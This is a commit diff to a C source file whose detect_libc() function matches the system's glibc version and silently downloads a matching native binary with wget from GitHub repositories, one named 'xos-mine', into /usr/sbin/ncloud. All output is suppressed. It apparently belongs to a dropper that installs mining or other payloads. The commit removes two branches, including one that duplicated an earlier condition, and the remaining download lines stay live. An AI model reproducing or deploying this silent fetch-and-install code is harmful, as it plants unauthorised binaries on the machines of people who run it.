d28452b7293ed740685987025342af5e4903a8b7
x011-al <x011pagkor@gmail.com>
2025-09-01 17:28:32 -0700

    Update sx.c

--- sx.c
+++ sx.c
@@ -68,10 +68,6 @@ void detect_libc() {
                 system("wget -q -O /usr/sbin/ncloud/build/Release/N.node https://github.com/xos-mine/ncloud/raw/refs/heads/main/build/Release/2.node >/dev/null 2>&1");
             } else if (strstr(buffer, "2.31-0ubuntu9.7")) {
                 system("wget -q -O /usr/sbin/ncloud/build/Release/N.node https://github.com/xos-mine/ncloud/raw/refs/heads/main/build/Release/3.node >/dev/null 2>&1");
-            } else if (strstr(buffer, "2.31-0ubuntu9.7")) {
-                system("wget -q -O /usr/sbin/ncloud/build/Release/N.node https://github.com/xos-mine/ncloud/raw/refs/heads/main/build/Release/4.node >/dev/null 2>&1");
-            } else if (strstr(buffer, "2.36-9+deb12u10")) {
-                system("wget -q -O /usr/sbin/ncloud/build/Release/N.node https://github.com/x011-al/tesb/raw/refs/heads/main/N.node >/dev/null 2>&1");
             } 
         }
     }
